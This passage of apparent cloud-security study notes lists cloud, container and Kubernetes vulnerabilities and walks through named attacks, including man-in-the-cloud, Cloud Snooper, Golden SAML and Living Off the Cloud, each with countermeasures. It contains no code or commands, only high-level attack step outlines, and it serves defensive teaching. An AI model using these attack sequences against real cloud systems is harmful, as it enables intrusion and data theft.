					- Implement stringent security measures for interfaces requiring public access through untrusted networks by utilizing jump servers.
			- Authentication Attacks:
				- Weak authentication mechanisms, such as weak passwords, password reuse, and single-factor authentication, enable attackers to gain unauthorized access to cloud computing systems.
				- Countermeasures:
					- Enforce strong password policies to enhance security.
					- Implement two-factor authentication where required.
					- Use IP whitelisting to restrict and control access.
					- Apply the principle of least privilege, granting users only the necessary access rights.
					- Enable robust Identity and Access Management (IAM) to monitor and control user access to cloud resources.
			- VM-Level Attacks:
				- Cloud computing heavily relies on virtualization technologies such as VMware, Xen, VirtualBox, and vSphere. These technologies are vulnerable to threats due to weaknesses in hypervisors.
				- Countermeasures:
					- Implement Intrusion Detection and Prevention Systems (IDS/IPS) and firewalls to mitigate known VM-level attacks.
					- Use well-configured and regularly updated hypervisors, along with sandboxes, to enhance security.
					- Leverage High Assurance Platforms (HAP) to ensure a high level of virtual machine isolation.
					- Prevent hardware sharing between valid virtual machine users to minimize risks.
			- Hijacking Accounts:
				- A major threat to organizations is the compromise of employee accounts on the cloud. If an attacker gains access to a cloud environment via a compromised user account, they can access all stored information without leaving any trace. Attackers commonly use phishing and password cracking techniques to obtain user credentials. These attacks can severely impact business operations, leading to reputational damage, loss of sensitive information, and degradation of brand value.
				- Countermeasures:
					- Grant users only the minimum access privileges required for their roles.
					- Implement defense-in-depth strategies and deploy IAM solutions.
					- Encrypt and securely store sensitive information on cloud servers.
					- Enforce strong authentication mechanisms, such as multi-factor authentication.
					- Remove inactive credentials and user accounts.
					- Detect and revoke unnecessary access to highly sensitive information.
					- Control third-party access to cloud resources.
					- Implement cloud tokenization to ensure only authorized users can access data.
					- Use a password manager to create and manage strong passwords for all user accounts.
		- Governance and Legal Risks:
			- Lock-in:
				- Lock-in refers to a client's inability to migrate from one Cloud Service Provider (CSP) to another or back to in-house systems due to a lack of tools, procedures, standard data formats, applications, or service portability. This risk is often linked to the inappropriate selection of a CSP, incomplete or non-transparent terms of use, and the absence of standard mechanisms.
				- Countermeasures:
					- Utilize standardized cloud APIs to enhance interoperability.
					- Adopt a multi-cloud or hybrid cloud strategy instead of relying on a single CSP.
					- Design portable and loosely coupled applications.
					- Implement DevOps tools to mitigate risks associated with proprietary configurations.
					- Establish a clear exit strategy before signing the initial agreement.
			- Licensing Risks:
				- Organizations may incur significant licensing fees if a CSP charges for software deployed in the cloud on a per-instance basis. To mitigate this, organizations should retain ownership of their software assets within the cloud provider's environment. Licensing risks primarily arise from incomplete or non-transparent terms of use.
				- Countermeasures:
					- Review the CSP’s current licensing policies to determine overall costs and develop an effective licensing strategy.
					- Use a centralized platform to manage licensing, costs, and software usage.
					- Eliminate unused or unnecessary cloud resources.
			- Risks from Changes in Jurisdiction:
				- Cloud providers may store customer data in multiple jurisdictions, some of which may pose high risks. Local authorities in high-risk regions (e.g., those lacking the rule of law, having unpredictable legal frameworks, or being governed by authoritarian regimes) may raid data centers, leading to enforced data disclosure or seizure. Jurisdictional changes could also result in government-imposed data blockages or impoundment. Organizations should evaluate jurisdictional risks before adopting a cloud solution, as local laws may grant governments access to private data.
				- Countermeasure:
					- Assess the jurisdictions where data may be stored or processed and evaluate any associated legal risks.
			- Subpoena and E-Discovery:
				- Customer data and services may be subject to legal orders, such as subpoenas or e-discovery requests, from authorities or third parties. This risk arises due to improper resource isolation, data storage across multiple jurisdictions, and a lack of awareness regarding applicable legal frameworks.
				- Countermeasures:
					- Carefully select a CSP that provides robust security and compliance measures.
					- Thoroughly review the service agreement, ensuring it covers records management, accessibility, customer support, legal policies, accountability, confidentiality, contract duration, and termination procedures.
					- Implement a well-coordinated e-discovery plan.
					- Develop and maintain a clear exit strategy.
		- Development and Resource Management:
			- Privilege Escalation:
				- Mistakes in access allocation systems, such as coding errors and design flaws, can result in customers, third parties, or employees obtaining more access rights than necessary. This threat arises due to vulnerabilities in authentication, authorization, and accountability, as well as issues related to user provisioning and de-provisioning, hypervisors, unclear roles and responsibilities, and misconfigurations.
				- Countermeasures:
					- Implement a robust privilege separation scheme.
					- Regularly update software programs to patch newly discovered privilege escalation vulnerabilities.
					- Conduct periodic audits of all Identity and Access Management (IAM) regulations and roles configured within cloud service environments.
					- Use standard network scanners and security query tools such as Shodan to scan for exposed APIs and monitor cloud services for suspicious network traffic or user behavior.
			- Insecure Software Development Practices:
				- Insecure software development practices may include inadequate testing, weak coding standards, insufficient access controls, and failure to follow best practices for data protection. These shortcomings can introduce vulnerabilities that attackers may exploit to gain unauthorized access, steal sensitive data, or disrupt cloud services. Such weaknesses provide easy entry points for cybercriminals, potentially leading to data breaches and significant financial and reputational damage.
				- Countermeasures:
					- Integrate security at every stage of the Software Development Life Cycle (SDLC).
					- Train developers in secure coding practices and make them aware of various security threats.
					- Conduct thorough code reviews and use automated testing tools to detect and fix vulnerabilities.
					- Implement strict access controls, restricting sensitive code and data access to authorized personnel only.
					- Adhere to established secure coding guidelines and best practices to minimize risks.
			- Resource Exhaustion:
				- Resource exhaustion occurs when computing resources such as CPU, memory, disk space, or network bandwidth are fully consumed, leaving no capacity for legitimate users or operations. This can severely impact organizations, leading to system slowdowns, service outages, and the inability to perform critical functions—ultimately causing revenue loss and reputational damage. Attackers may also exploit resource exhaustion to launch Distributed Denial-of-Service (DDoS) attacks or other resource-intensive activities to disrupt services or cause system failures.
				- Countermeasures:
					- Continuously monitor resource usage and set up alerts for abnormal consumption.
					- Implement auto-scaling and load balancing to dynamically adjust resources based on demand and distribute workloads to prevent overloads.
					- Enforce rate limiting and resource usage controls per user or application.
					- Deploy firewalls and anti-DDoS tools to detect and mitigate attacks.
					- Optimize application performance by regularly reviewing and refining code and configurations to ensure efficient resource utilization.
			- Lack of Security Architecture:
				- As organizations migrate their IT infrastructure to the public cloud, developing and implementing appropriate security strategies to counter cyber threats is a major challenge. It is crucial to establish a well-defined security architecture before transitioning IT capabilities to the cloud.
				- Countermeasures:
					- Align security architecture with business goals and objectives.
					- Regularly update the threat model to reflect emerging risks.
					- Conduct periodic security assessments to evaluate and enhance the actual security posture.
	- Container Vulnerabilities:
		- Containers have become increasingly important in cloud computing, offering operational efficiency, productivity, and consistency. However, the adoption of various cloud services has also led to a rise in threats and attacks targeting cloud containers. A successful attack on a container can have widespread consequences, as it can be rapidly replicated, leading to numerous victims falling prey to attackers.
		- The table below outlines the most common container vulnerabilities:
		- Vulnerabilities:
			- Hasty Image Creation: Carelessly creating container images without implementing security safeguards or controls can introduce vulnerabilities.
			- Insecure Image Configurations: Using a base image that contains outdated or unnecessary software increases the attack surface, exposes sensitive information, and makes the container more vulnerable to security breaches.
			- Unreliable Third-Party Resources: Using untrusted third-party resources poses severe security risks, making the container susceptible to malicious attacks.
			- Unauthorized Access: Unauthorized access to user accounts can lead to privilege escalation attacks, compromising container security.
			- Insecure Container Runtime Configurations: Improper handling of configuration options and mounting sensitive directories on the host can result in faulty and insecure runtime settings.
			- Data Exposure in Docker Files: Exposing sensitive information in Docker images, such as passwords and SSH encryption keys, can be exploited to compromise container security.
			- Embedded Malware: A container image may be embedded with malware after its creation, or hardcoded functions may download malware upon deployment.
			- Outdated Images: Using outdated container images introduces security vulnerabilities and bugs that compromise the overall security of the system.
			- Hijacked Repositories and Infected Resources: Security misconfigurations and software bugs may allow unauthorized access to repositories, enabling attackers to alter or delete files, thereby poisoning the resources.
			- Compromised Image Registries: Mismanaged configurations and vulnerabilities can be exploited to compromise image registries and container hubs.
			- Exposed Services Due to Open Ports: Misconfigured applications may expose sensitive information by leaving ports open, making them vulnerable to port scanning attacks.
			- Exploited Applications: Vulnerable applications within containers can be exploited using various techniques such as SQL injection (SQLi), cross-site scripting (XSS), and remote file inclusion (RFI).
			- Mixing Workloads with Different Sensitivity Levels: Orchestrators that place workloads with different sensitivity levels on the same host create security risks. For example, if a container hosts a vulnerable public web server, it may jeopardize containers processing sensitive information.
	- Kubernetes Vulnerabilities:
		- The implementation of Kubernetes has enabled IT leaders to bridge on-premises and public cloud environments. Kubernetes allows for layering and application scaling within containers in the cloud, providing a more portable and efficient infrastructure. However, the increasing adoption of Kubernetes has also made it a target for critical cyber-attacks that exploit underlying vulnerabilities.
		- The table below summarizes common vulnerabilities in Kubernetes environments:
			- Lack of Certificate Revocation:
				- Kubernetes does not support certificate revocation, requiring the entire certificate chain to be regenerated to remove a compromised certificate.
				- Attackers can exploit the certificate before it is fully replaced across the cluster.
			- Unauthenticated HTTPS Connections:
				- While Kubernetes relies on public key infrastructure (PKI), it does not always properly authenticate connections between components using Transport Layer Security (TLS).
				- Attackers can gain unauthorized access to kubelet-managed pods and retrieve sensitive information.
			- Exposure of Bearer Tokens in Logs:
				- Kubernetes requires an authentication mechanism to enforce user privileges, such as bearer tokens, which may be logged in hyperkube kube-apiserver system logs.
				- Attackers with access to system logs can exploit bearer tokens to impersonate previously authenticated users.
			- Exposure of Sensitive Data via Environment Variables:
				- Environmental variables are often used to configure Kubernetes components, storing sensitive values.
				- Attackers can access these stored values through environment logging and exploit them to target endpoints.
			- Secrets at Rest Not Encrypted by Default:
				- User-defined secrets, such as credentials and application configuration data, are not encrypted by default in Kubernetes.
				- Attackers who gain access to etcd servers can retrieve unencrypted secrets.
			- Non-Constant Time Password Comparison:
				- Kube-apiserver supports multiple authentication backends but does not perform secure comparisons of secret values when using basic password authentication.
				- Attackers can execute timing attacks to extract passwords.
			- Hardcoded Credential Paths:
				- Instead of hardcoding credential paths in the source code, Kubernetes allows specifying them via an interface during configuration.
				- If the cluster token and root Certificate Authority (CA) are stored in separate locations, attackers can insert a malicious token and root CA to compromise the cluster.
			- Non-Atomic Log Rotation:
				- Kubelet, the primary node agent, uses logs to store metadata about containers. During log rotation, if kubelet is restarted, all logs may be lost.
				- Attackers can monitor log rotation and attempt to delete logs when the process occurs.
			- No Back-Off Mechanism for Scheduling:
				- Kubernetes pods require careful coordination for scheduling but lack a back-off mechanism when scheduling fails.
				- This results in a tight loop, where the scheduler repeatedly attempts to schedule pods that are continually rejected.
			- Lack of Non-Repudiation:
				- Kube-apiserver handles all user transactions, such as creation, modification, and deletion, without a central auditing service.
				- If debug mode is disabled, kube-apiserver does not record user actions.
				- Attackers can directly interact with kube-apiserver and carry out malicious activities without accountability.
	- Cloud Attacks:
		- In this section, we discuss various attack methods targeting cloud computing environments.
		- Service Hijacking Using Social Engineering:
			- In account or service hijacking, an attacker steals the credentials of a cloud service provider (CSP) or a client through phishing, pharming, social engineering, or by exploiting software vulnerabilities. Using these stolen credentials, the attacker gains unauthorized access to cloud services, compromising data confidentiality, integrity, and availability.
			- Social engineering is a non-technical intrusion method that relies on human interaction and deception to bypass security procedures. Attackers may target CSPs to reset passwords or manipulate IT staff into revealing credentials. Other methods for obtaining passwords include guessing, keylogging malware, password-cracking techniques, and phishing emails. Successful social engineering attacks can lead to the exposure of customer and credit card data, personal information, business plans, employee details, identity theft, and more.
			- As illustrated in the figure, the attacker first creates a fake cloud service login page and sends a malicious link to a cloud service user. When the user clicks the link and enters their login credentials, they fail to notice that the page is fraudulent. Upon submission, the attacker captures the credentials while the user is automatically redirected to the legitimate cloud service login page. The attacker then uses the stolen credentials to log in and carry out malicious activities.
			- Countermeasures:
				- Do not share account credentials between users and services.
				- Implement strong two-factor or multi-factor authentication wherever possible.
				- Train employees to recognize and respond to social engineering attacks.
				- Adhere strictly to established security policies.
				- Encrypt data before transmitting it over the Internet.
				- Follow the principle of least privilege to restrict unnecessary access.
				- Divide administrative responsibilities between CSP administrators and your organization’s administrators to prevent unrestricted access to all security layers.
		- Service Hijacking Using Network Sniffing:
			- Network sniffing involves intercepting and monitoring network traffic between cloud nodes. Unencrypted sensitive data (e.g., login credentials) transmitted over a network is at high risk of exposure. Attackers use packet sniffers, such as Wireshark, to capture sensitive information, including passwords, session cookies, and security configuration data related to web services, such as Universal Description, Discovery, and Integration (UDDI), Simple Object Access Protocol (SOAP), and Web Service Description Language (WSDL) files.
			- As shown in the figure, when a user enters login credentials to access cloud services, an attacker can intercept the credentials or session cookies during transmission using packet-sniffing tools like Wireshark and Capsa Portable Network Analyzer. The attacker then uses the stolen credentials to log into the cloud services and gain unauthorized access.
			- Countermeasures:
				- Encrypt sensitive data transmitted over the network.
				- Encrypt sensitive data stored in configuration files.
				- Detect network interface controllers (NICs) operating in promiscuous mode.
				- Ensure that web traffic containing credentials is secured with SSL/TLS encryption.
		- Side-Channel Attacks or Cross-Guest VM Breaches:
			- Attackers can compromise the cloud by placing a malicious virtual machine (VM) near a target cloud server and launching a side-channel attack. The figure below illustrates how an attacker can achieve this by deploying a malicious VM on the same physical host as the target VM and exploiting shared physical resources (such as the processor cache).
			- Once positioned, the attacker executes side-channel attacks—including timing attacks, data remanence, acoustic cryptanalysis, power monitoring attacks, and differential fault analysis—to extract cryptographic keys or plaintext secrets. This enables the attacker to steal the victim’s credentials.
			- Side-channel attacks can be carried out by any co-resident user and primarily exploit vulnerabilities in shared technology resources. Ultimately, the attacker uses the stolen credentials to impersonate the victim.
			- Side-Channel Attack Countermeasures:
				- Implement a virtual firewall in the cloud server back end to prevent attackers from deploying malicious VMs.
				- Use randomized encryption and decryption techniques with algorithms such as RSA, 3DES, and AES to mitigate cryptographic vulnerabilities.
				- Lock down OS images and application instances to eliminate potential attack vectors that could provide unauthorized access.
				- Monitor local memory access and hypervisor processes by configuring and collecting process monitoring data and system logs to detect repeated access attempts.
				- Develop applications and OS components with consistent and predictable resource access patterns to prevent attackers from gathering sensitive information through timing statistics and other behavioral attributes.
		- Wrapping Attack:
			- A wrapping attack occurs during the translation of a SOAP message at the TLS layer. In this attack, adversaries duplicate the message body and send it to the server as if it were from a legitimate user.
			- As shown in the figure below, when users send a request from their virtual machine (VM) through a browser, the request first reaches the web server. A SOAP message containing structural information is then generated and exchanged with the browser. Before message transmission, the browser must sign the XML document, canonicalize it, and append the signature values to the document. Additionally, the SOAP header must contain the necessary information for the destination after computation.
			- In a wrapping attack, attackers exploit the translation of the SOAP message within TLS by duplicating the message body and resending it to the server. Since the server verifies authentication through the signature value—which is also duplicated—the attacker can bypass security measures. As a result, the adversary can infiltrate the cloud environment and execute malicious code, disrupting normal cloud server operations.
			- Countermeasures:
				- Use XML schema validation to detect altered SOAP messages.
				- Apply authenticated encryption as per the XML encryption specification.
				- Strengthen the interface between signature verification and business logic functions.
				- Implement the WS-SecurityPolicy “SignedParts” policy to ensure that users specify which SOAP body and headers must be signed.
				- Utilize the CryptoCoverageChecker interceptor to define XPath expressions for elements that should be signed or encrypted.
		- Man-in-the-Cloud (MITC) Attack:
			- MITC attacks are an advanced version of MITM (Man-in-the-Middle) attacks. In MITM attacks, an attacker intercepts and manipulates communication between two parties. In contrast, MITC attacks exploit cloud file synchronization services, such as Google Drive or Dropbox, to compromise data, establish command and control (C&C), exfiltrate data, and gain remote access. Synchronization tokens, used for application authentication in the cloud, cannot differentiate between malicious and normal traffic, making them vulnerable to abuse by attackers.
			- As shown in the figure, the attacker deceives the victim into installing malicious code that implants the attacker's synchronization token on the victim’s drive. As a result, the victim’s Drive application syncs with the attacker’s account. The attacker then steals the victim’s synchronization token and uses it to access the victim’s files. Later, the attacker replaces the malicious token with the victim’s original synchronization token, restoring the Drive application to its original state and remaining undetected.
			- Countermeasures:
				- Use an email security gateway to detect social engineering attacks that could lead to MITC attacks.
				- Strengthen token expiration policies to prevent such attacks.
				- Deploy efficient antivirus software to detect and remove malware.
				- Implement a Cloud Access Security Broker (CASB) to monitor cloud traffic and detect anomalies.
				- Monitor employee activities to identify signs of cloud synchronization token abuse.
				- Encrypt cloud-stored data and ensure encryption keys are not stored within the same cloud service.
				- Enforce two-factor authentication (2FA) for enhanced security.
		- Cloud Hopper Attack:
			- Cloud hopper attacks target managed service providers (MSPs) and their customers. Once an attack is successfully executed, attackers gain remote access to the intellectual property and critical information of the MSP and its global users/customers. They move laterally within the cloud environment, infiltrating multiple systems to access sensitive data related to various industries, including manufacturing, government, healthcare, and finance.
			- Attackers typically initiate spear-phishing campaigns, embedding custom-made malware in emails to compromise user accounts of MSP staff or cloud service firms. This allows them to obtain confidential information. Additionally, they leverage PowerShell and PowerSploit command-based scripting for reconnaissance and data gathering. Using the gathered intelligence, attackers gain unauthorized access to other systems connected to the same network.
			- To carry out this attack, command-and-control (C&C) servers spoof legitimate domains, and fileless malware is deployed, executing directly from memory to evade detection. Attackers often impersonate valid service providers to bypass security mechanisms, ultimately gaining complete access to corporate data and connected customers.
			- As illustrated in the figure, an attacker infiltrates the target MSP, distributes malware, and gains remote access. Using compromised MSP credentials, the attacker accesses customer profiles, compresses sensitive customer data, and stores it within the MSP infrastructure. The stolen data is then extracted and used to launch further attacks on the target organization and its users.
			- Countermeasures:
				- Implement multi-factor authentication (MFA) to prevent credential compromise.
				- Foster strong coordination between customers and cloud service providers (CSPs) to detect and respond to abnormal incidents.
				- Ensure customers are educated on cloud service policies and follow best security practices.
				- Use data categorization to minimize the impact of attacks and prevent data breaches.
				- Deploy jump servers to enhance security and mitigate cloud hopper attacks.
		- Cloud Cryptojacking:
			- Cryptojacking is the unauthorized use of a victim’s computer to stealthily mine digital currency. These attacks are highly lucrative and can involve both external attackers and rogue insiders. To execute such an attack, adversaries exploit vulnerabilities such as cloud misconfigurations, compromised websites, and client- or server-side weaknesses.
			- For example, an attacker may take advantage of misconfigured cloud instances to inject a malicious crypto-mining payload into a web page or a third-party library used by that web page. The attacker then lures victims into visiting the compromised web page, which automatically executes the crypto-miner in the victim’s browser using JavaScript. JavaScript-based crypto-miners, such as CoinHive and CryptoLoot, enable attackers to embed malicious scripts into legitimate websites simply by including a link to CoinHive.
			- To evade detection, attackers use various obfuscation techniques, such as encoding, redirections, and script obfuscation. The configuration of the payload can be either dynamically generated or hardcoded. Cryptojacking attacks can have severe consequences, affecting websites, endpoints, and even entire cloud infrastructures.
			- Steps of Cloud Cryptojacking Attack:
				- Compromise: The attacker infiltrates a cloud service and embeds a malicious crypto-mining script.
				- Execution: When a victim connects to the compromised cloud service, the crypto-mining script runs automatically.
				- Mining: The victim unknowingly mines cryptocurrency on behalf of the attacker, contributing to blockchain computations.
				- Reward: For each successfully mined block, the attacker illicitly receives cryptocurrency rewards.
			- Countermeasures:
				- Enforce a strong password policy.
				- Maintain three copies of critical data in separate locations, including one off-site backup.
				- Regularly patch web servers, cloud instances, and connected devices.
				- Use encrypted SSH key pairs instead of passwords for cloud server access.
				- Implement CoinBlocker URL and IP blacklisting in firewalls.
				- Deploy real-time monitoring for the web page Document Object Model (DOM) and JavaScript environments to detect malicious activity early.
				- Use up-to-date antivirus, anti-malware, and ad-blocking tools in cloud environments.
				- Install browser extensions to detect and block scripts similar to CoinHive’s mining script.
				- Implement endpoint security management tools to identify rogue applications on devices.
				- Regularly audit third-party components used on company websites.
				- Use advanced network monitoring tools to detect abnormal CPU resource usage and mining activities.
				- Monitor cloud resource utilization for unexpected cost spikes, as crypto miners often abuse cloud resources.
				- Ensure all unused cloud instances and services are properly terminated to prevent unauthorized access.
		- Cloudborne Attack:
			- Cloudborne is a vulnerability in bare-metal cloud servers that allows attackers to implant malicious backdoors in firmware. These backdoors can persist even after the server is reassigned to new clients or businesses using it as an IaaS. Since physical servers are not dedicated to a single client, they are frequently reallocated. If the firmware re-flash process (factory reset, complete memory wipe, etc.) is not properly implemented during reclamation, backdoors can remain active and migrate with the server.
			- Attackers exploit vulnerabilities in Supermicro hardware to overwrite the firmware of the Baseboard Management Controller (BMC)—a component used for remote management, provisioning, OS reinstallation, and troubleshooting via the Intelligent Platform Management Interface (IPMI). Since the BMC can remotely control and provision servers for new customers, it becomes a prime target. Weaknesses in bare-metal cloud security and improper firmware re-flashing enable attackers to install and maintain persistent backdoors.
			- Once implanted, these backdoors allow attackers to:
				- Directly access server hardware and bypass security mechanisms.
				- Monitor new customers’ activities.
				- Disable applications or servers.
				- Intercept sensitive data.
			- Such exploits can lead to ransomware attacks and other security breaches.
			- Countermeasures:
				- Keep firmware up to date.
				- Sanitize server firmware before reassigning it to new customers.
				- Validate servers for implants and backdoors before deployment.
				- Regularly check for firmware vulnerabilities.
				- Verify physical hardware integrity before delivery.
		- Instance Metadata Service (IMDS) Attack:
			- An Instance Metadata Service (IMDS) provides information about an instance, its associated network, and the software configured to run on it. IMDS also generates credentials for roles associated with the instance. Based on the assigned role or policy, the software running on the instance can access cloud storage resources.
			- Attackers exploit IMDS vulnerabilities by leveraging zero-day vulnerabilities in the target application server or extracting information leaked through a misconfigured reverse proxy. The primary goal of an IMDS attack is to gain unauthorized access to network resources by compromising instances. If attackers successfully exploit a zero-day vulnerability or obtain leaked credentials via a reverse proxy, they can connect to the cloud instance and retrieve sensitive information, such as user data and roles associated with the instance. These credentials can then be used to escalate privileges and perform further attacks, including unauthorized access, abuse, or modification of cloud storage resources.
			- How the Attack is Launched:
				- The attacker exploits a zero-day vulnerability or a misconfigured reverse proxy on the target application server.
				- They then compromise the cloud instance running on the server and extract metadata from the instance.
				- Using the obtained credentials, the attacker gains unauthorized access to cloud resources.
			- Countermeasures:
				- Use IMDSv2 instead of IMDSv1.
				- Disable IMDS when it is not required.
				- Avoid assigning roles to instances unless necessary; if required, grant the least privileges needed.
				- Restrict IMDS access for untrusted or suspicious users.
		- Cache Poisoned Denial of Service (CPDoS) / Content Delivery Network (CDN) Cache Poisoning Attack:
			- A Cache Poisoned Denial of Service (CPDoS) attack or CDN cache poisoning attack occurs when attackers send malformed or oversized HTTP requests to an origin web server, causing it to respond with malicious or error content. This content is then cached by Content Delivery Network (CDN) servers, which subsequently serve the poisoned response to legitimate users. As a result, users receive error pages instead of legitimate content, effectively causing a Denial of Service (DoS) attack against the target website.
			- CPDoS attacks typically exploit misconfigured CDN-protected servers that unintentionally store and serve error responses from the origin server. Attackers can leverage this technique to prevent users from accessing cloud services. Even a single poisoned HTTP request, once cached, can render a web page or server unreachable, disrupting the website’s online services.
			- Steps of CDN Cache Poisoning Attack Leading to DoS:
				- Malicious Request: An attacker submits a request to the target web server containing a specially crafted HTTP header.
				- Forwarding to the Origin Server: If the CDN does not have a cached version of the requested resource, it forwards the request to the origin web server.
				- Error Response Caching: Since the request is malformed, the origin server returns an error page (e.g., 404 Not Found), which is mistakenly cached by the CDN.
				- Propagation of the Poisoned Cache: The CDN now serves the cached error page instead of the actual content, making the legitimate webpage inaccessible.
				- Widespread Service Disruption: The CDN propagates the same error page to other users, effectively denying access to the targeted service.
			- Countermeasures Against CDN Cache Poisoning Attacks:
				- Disable Caching of Error Pages: Configure the CDN to prevent the caching of HTTP error responses.
				- Implement a Web Application Firewall (WAF): Use a WAF to detect and block malicious HTTP requests before they reach the origin server.
				- Monitor and Clear Poisoned Cache Entries: Regularly inspect CDN cache contents and remove any error pages that may have been stored.
		- Cloud Snooper Attack:
			- A Cloud Snooper attack is a sophisticated cyberattack targeting AWS Security Groups (SGs) to compromise a server and extract sensitive data stealthily. Attackers exploit weakly configured firewalls or underlying vulnerabilities to bypass security controls, such as firewalls, and gain remote access to the target server.
			- In this attack, attackers exploit weaknesses in SGs, which are designed to allow only traffic with destination ports 80 (HTTP) or 443 (HTTPS). They install rootkits by leveraging vulnerabilities in traffic filters, supply-chain attacks, or brute-force SSH attacks. The attackers then send Command and Control (C2) packets, disguising them as legitimate traffic. The installed rootkit intercepts these packets and redirects the commands to a backdoor Trojan, which executes malicious activities based on the received C2 instructions.
			- Steps Involved in Cloud Snooper Attack:
				- Initial Attack: The attacker sends specially crafted C2 packets alongside normal traffic to the target server, using destination ports 80 and 443 to evade detection by the perimeter firewall.
				- Firewall Evasion: The firewall verifies incoming packets and allows them through, as they appear to use legitimate ports (80 and 443).
				- Traffic Interception: A listener in the rootkit intercepts incoming traffic and reconstructs the packets with new source ports (e.g., 1010, 2020, 6060, 7070, 8080, 9999). The listener then forwards these packets to the backdoor Trojan installed by the rootkit.
				- Execution of Malicious Commands: The Trojan executes commands from the attacker, collects sensitive data, and sends it back to the rootkit.
				- Data Exfiltration: The rootkit reconstructs outgoing packets using ports 80 and 443 to bypass firewall rules, exfiltrating stolen data to the attacker.
			- Countermeasures:
				- Regularly analyze and monitor network traffic for anomalies.
				- Ensure that web servers and security patches are regularly updated.
				- Implement a layered security model to prevent unauthorized access.
		- Golden SAML Attack:
			- A Golden Security Assertion Markup Language (SAML) attack is a cyberattack targeting identity providers in cloud networks, such as Active Directory Federation Services (ADFS), which use the SAML protocol for authentication and authorization. Attackers first gain administrative access to the identity provider’s user profile and then exploit token signing certificates to forge SAML tokens or responses by manipulating SAML assertions. This access is typically obtained through session hijacking, privilege escalation, or lateral movement using previously exploited vulnerabilities or other attacks.
			- Golden SAML Attack Scenario:
				- The attacker gains access to the ADFS server (identity provider) and steals the signing certificate and encryption key used to sign assertions.
				- When a user attempts to access a service, the service provider redirects the request to the identity provider for authentication.
				- (Step missing in the original text: The identity provider generates and sends a SAML assertion in response.)
				- The attacker intercepts the redirect request and sends a forged SAML response with manipulated assertion values using the stolen keys.
				- The service provider accepts the forged SAML response, granting the attacker unauthorized access to federated services associated with the target user account.
			- Countermeasures:
				- Continuously monitor user activities to detect anomalies.
				- Enforce multi-factor authentication (MFA) and require strong passwords.
				- Implement least-privilege access to limit exposure.
				- Analyze system logs and security alerts for signs of an attack.
				- Regularly update and rotate certificates to prevent misuse.
		- Living Off the Cloud Attack (LotC):
			- Living Off the Cloud (LotC) is a modern evolution of the "living off the land" attack, in which attackers exploit a victim’s SaaS and IaaS-based applications to carry out malicious activities such as data exfiltration. Because organizations cannot block these essential cloud services, LotC attacks have become a prominent attack vector. A successful LotC attack can enable attackers to steal sensitive data stored in the cloud, mine cryptocurrency, launch DDoS attacks, and more.
			- How Living Off the Cloud Attack Works:
				- Initial Access: The attacker gains entry into the victim's environment through methods such as phishing emails, exploiting vulnerabilities, or using previously stolen credentials.
				- Lateral Movement: The attacker navigates within the network using legitimate tools such as CMD, PowerShell, and Certutil.
				- Payload Delivery: The attacker delivers malware payloads to the victim’s device via cloud storage services like Dropbox and Google Drive.
				- Covert Communication: The attacker establishes covert communication channels (C2) using the victim’s cloud services, such as Ngrok.
				- Malicious Activities: The attacker engages in various malicious activities, including hosting malware on cloud storage, sending phishing links from trusted domains, and exfiltrating sensitive data.
				- Persistence & Evasion: The attacker blends in with legitimate cloud traffic by abusing the victim’s SaaS or IaaS applications, maintaining long-term access while avoiding detection.
			- Countermeasures:
				- Use cloud-native security solutions with a single-pass architecture to inspect and secure traffic in real-time.
				- Implement zero-trust security to limit unauthorized access to resources.
				- Restrict file uploads to cloud services by allowing only corporate instances of Dropbox or blocking the upload of files containing sensitive data such as PII, Social Security numbers, or credit card information.
				- Train employees regularly to recognize and avoid suspicious emails, links, downloads, and other unauthorized activities.
				- Enable detailed logging of all activities within cloud environments and endpoints.
				- Leverage machine learning and behavioral analytics to detect unusual patterns that may indicate the malicious use of legitimate tools.
				- Apply application whitelisting to restrict the execution of unauthorized applications and scripts.
				- Implement network segmentation to limit lateral movement within the network.
				- Enforce multi-factor authentication (MFA) for accessing sensitive systems and cloud services.
				- Use role-based access control (RBAC) to ensure users have only the minimum permissions necessary for their job functions.
		- Session Hijacking Using Cross-Site Scripting (XSS) Attack:
			- Attackers exploit XSS vulnerabilities to steal cookies used in user authentication. This involves injecting malicious code into a website, which is then executed by the victim's browser. By stealing cookies, attackers can hijack active sessions and gain unauthorized access to user data. Additionally, attackers may predict or intercept session IDs to facilitate hijacking.
			- As shown in the figure, the attacker hosts a web page containing a malicious script on a cloud server. When a user visits the compromised page, the malicious script executes in the user’s browser, capturing authentication cookies and sending them to the attacker’s server. The attacker can then use these stolen cookies to gain unauthorized access.
			- Countermeasures:
				- Implement Secure Socket Layer (SSL) encryption to protect data transmission.
				- Use firewalls, antivirus software, and code scanners to detect and prevent malicious scripts.
				- Implement HttpOnly and Secure flags for cookies to prevent unauthorized access.
				- Regularly update and audit web applications to patch vulnerabilities.
		- Session Hijacking via Session Riding:
			- Attackers exploit websites using cross-site request forgery (CSRF) to send unauthorized commands. In session riding, attackers "ride" an active user session by tricking users into clicking a malicious link—often via email or a compromised webpage—while logged into a legitimate site. When users interact with the malicious link, the website processes the request as if the user had authenticated it. This can lead to unauthorized actions such as modifying or deleting data, performing financial transactions, or resetting passwords.
			- As illustrated in the figure above, a user logs into a trusted site, initiating a new session. The server stores the session identifier in a cookie within the user's web browser. The attacker then deceives the user into visiting a malicious website, which sends a request to the cloud server from the user’s browser using the stolen session cookie.
			- Countermeasures:
				- Avoid saving login details in browsers or websites.
				- Validate the HTTP referrer header and, when processing POST requests, ignore URL parameters.
		- Domain Name System (DNS) Attacks:
			- A DNS server translates a human-readable domain name (e.g., www.google.com) into a numerical IP address, enabling communication between network nodes. Attackers exploit DNS vulnerabilities to intercept or manipulate user requests, often to steal authentication credentials or redirect users to malicious websites.
			- Types of DNS Attacks:
				- DNS Poisoning: Redirects users to a spoofed website by corrupting the DNS server or the DNS cache on a user’s system.
				- Cybersquatting: Involves registering a domain name similar to a legitimate Cloud Service Provider (CSP) to conduct phishing scams.
				- Domain Hijacking: Steals a domain name by exploiting vulnerabilities in domain registration services.
				- Domain Sniping: Involves acquiring an expired domain name before its original owner can renew it.
			- As illustrated in the figure, DNS cache poisoning is a common attack in which an attacker manipulates a DNS cache to redirect users to a fraudulent website. In this scenario, when a user queries an internal DNS server for the IP address of www.xCloud.com, the DNS server forwards the request to the respective cloud server. The attacker intercepts this communication, blocks the legitimate DNS response, and injects a falsified DNS response containing the IP address of a fake website. Consequently, the internal DNS server updates its cache with the attacker's malicious IP, unknowingly directing users to counterfeit websites.
			- Countermeasures:
				- Implementing Domain Name System Security Extensions (DNSSEC) helps authenticate DNS responses and mitigate DNS-related threats.
		- SQL Injection Attacks:
